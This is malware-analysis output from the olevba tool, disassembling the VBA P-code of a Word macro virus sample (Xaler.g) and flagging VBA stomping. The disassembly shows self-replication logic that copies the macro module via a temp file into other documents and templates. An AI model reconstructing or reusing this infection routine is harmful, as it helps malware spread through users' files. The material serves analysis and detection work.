olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Xaler.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.vba 
in file: ./Virus.MSWord.Xaler.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Xaler.g
' ===============================================================================
' Error: unpack_from requires a buffer of at least 298 bytes for unpacking 2 bytes at offset 296 (actual buffer size is 192).
' Module streams:
' Macros/VBA/ThisDocument - 6944 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0005 "RELAX"
' Line #1:
' 	FuncDefn (Private Sub id_021C())
' Line #2:
' 	End 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub id_021E())
' Line #6:
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub id_0220())
' Line #10:
' 	ArgsCall (Call) id_0222 0x0000 
' Line #11:
' 	ArgsCall (Call) id_021C 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub id_0222())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld id_0224 
' 	MemSt id_0226 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld id_0224 
' 	MemLd id_0228 
' 	MemSt id_022A 
' Line #18:
' 	LitStr 0x000B "C:\temp.tmp"
' 	St id_022C$ 
' Line #19:
' 	Ld id_022C$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld id_022E 
' 	MemLd id_0230 
' 	MemLd id_0232 
' 	ArgsMemLd id_0234 0x0001 
' 	ArgsMemCall id_0236 0x0001 
' Line #20:
' 	Ld id_022C$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #21:
' 	LitDI2 0x0001 
' 	ArgsLd id_023A 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input 0x0002 
' 	St id_0238 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld id_0238 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St id_023C& 
' Line #24:
' 	Ld id_0238 
' 	Ld id_0238 
' 	FnLen 
' 	Ld id_023C& 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd id_023E$ 0x0002 
' 	St id_0238 
' Line #25:
' 	StartForVariable 
' 	Ld id_0240 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #26:
' 	Ld id_0240 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld id_022C$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld id_0242 
' 	MemLd id_0230 
' 	MemLd id_0232 
' 	ArgsMemLd id_0234 0x0001 
' 	ArgsMemCall id_0236 0x0001 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	Ld id_022C$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld id_0244 
' 	MemLd id_0230 
' 	MemLd id_0232 
' 	ArgsMemLd id_0234 0x0001 
' 	ArgsMemCall id_0236 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld id_022C$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsLd id_023A 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input 0x0002 
' 	St id_0246 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld id_0246 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St id_0248 
' Line #35:
' 	Ld id_0248 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Ld id_0240 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld id_0238 
' 	LitStr 0x000C "ThisDocument"
' 	Ld id_0242 
' 	MemLd id_0230 
' 	MemLd id_0232 
' 	ArgsMemLd id_0234 0x0001 
' 	MemLd id_024A 
' 	ArgsMemCall id_024C 0x0002 
' Line #38:
' 	Ld id_0242 
' 	ArgsMemCall id_024E 0x0000 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld id_0238 
' 	LitStr 0x000C "ThisDocument"
' 	Ld id_0244 
' 	MemLd id_0230 
' 	MemLd id_0232 
' 	ArgsMemLd id_0234 0x0001 
' 	MemLd id_024A 
' 	ArgsMemCall id_024C 0x0002 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld id_0240 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	QuoteRem 0x0000 0x0014 "===================="
' Line #45:
' 	Dim 
' 	VarDefn id_0250 (As Byte)
' Line #46:
' 	LitDI2 0x0001 
' 	St id_0250 
' Line #47:
' 	Ld FreeFile 
' 	St id_0252 
' Line #48:
' 	Ld id_0244 
' 	MemLd id_0254 
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #49:
' 	Ld id_0244 
' 	MemLd id_0254 
' 	Ld id_0252 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #50:
' 	Ld id_0252 
' 	Sharp 
' 	LitDI2 0x035E 
' 	Ld id_0250 
' 	PutRec 
' Line #51:
' 	Ld id_0252 
' 	Sharp 
' 	Close 0x0001 
' Line #52:
' 	Ld id_0244 
' 	ArgsMemCall id_024E 0x0000 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Ld id_022C$ 
' 	ArgsCall id_0256 0x0001 
' Line #55:
' 	LitVarSpecial (True)
' 	Ld id_0224 
' 	MemSt id_0226 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Private Sub id_0258())
' Line #59:
' 	ArgsCall (Call) id_0222 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' Line #278:
' Line #279:
' Line #280:
' Line #281:
' Line #282:
' Line #283:
' Line #284:
' Line #285:
' Line #286:
' Line #287:
' Line #288:
' Line #289:
' Line #290:
' Line #291:
' Line #292:
' Line #293:
' Line #294:
' Line #295:
' Line #296:
' Line #297:
' Line #298:
' Line #299:
' Line #300:
' Line #301:
' Line #302:
' Line #303:
' Line #304:
' Line #305:
' Line #306:
' Line #307:
' Line #308:
' Line #309:
' Line #310:
' Line #311:
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' Line #316:
' Line #317:
' Line #318:
' Line #319:
' Line #320:
' Line #321:
' Line #322:
' Line #323:
' Line #324:
' Line #325:
' Line #326:
' Line #327:
' Line #328:
' Line #329:
' Line #330:
' Line #331:
' Line #332:
' Line #333:
' Line #334:
' Line #335:
' Line #336:
' Line #337:
' Line #338:
' Line #339:
' Line #340:
' Line #341:
' Line #342:
' Line #343:
' Line #344:
' Line #345:
' Line #346:
' Line #347:
' Line #348:
' Line #349:
' Line #350:
' Line #351:
' Line #352:
' Line #353:
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' Line #358:
' Line #359:
' Line #360:
' Line #361:
' Line #362:
' Line #363:
' Line #364:
' Line #365:
' Line #366:
' Line #367:
' Line #368:
' Line #369:
' Line #370:
' Line #371:
' Line #372:
' Line #373:
' Line #374:
' Line #375:
' Line #376:
' Line #377:
' Line #378:
' Line #379:
' Line #380:
' Line #381:
' Line #382:
' Line #383:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

